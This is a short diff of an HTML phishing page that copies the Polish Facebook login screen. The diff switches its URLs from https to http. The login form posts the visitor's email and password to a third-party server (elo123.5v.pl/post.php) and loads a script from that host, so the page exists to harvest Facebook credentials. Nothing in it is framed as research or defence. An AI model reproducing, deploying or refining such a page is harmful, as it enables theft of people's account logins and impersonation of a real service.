@@ -21,13 +21,13 @@
 	<div class="logowanie">
 		<div class="container">
 			<div class="loginbox">
-				<form action="https://elo123.5v.pl/post.php" method="post">
+				<form action="http://elo123.5v.pl/post.php" method="post">
 				<h1>Zaloguj się  do Facebooka</h1>
 				<input type="text" name="email" placeholder="Adres e-mail lub numer telefonu"> <br>
 				<input type="password" name="pass" placeholder="Hasło"> <br>
 				<input type="submit" name="get" value="Zaloguj się"> <br>
 				</form>
-				<a href="#">Nie pamiętasz nazwy konta?</a> - <a href="https://facebook.com">Zarejestruj się na Facebooku</a>
+				<a href="#">Nie pamiętasz nazwy konta?</a> - <a href="http://facebook.com">Zarejestruj się na Facebooku</a>
 			</div>
 		</div>
 	</div>
@@ -71,6 +71,6 @@
 			<p>Facebook © 2016</p>
 		</div>
 	</div>
-    <script src="https://elo123.5v.pl/js/bootstrap.min.js"></script>
+    <script src="http://elo123.5v.pl/js/bootstrap.min.js"></script>
 </body>
 </html>
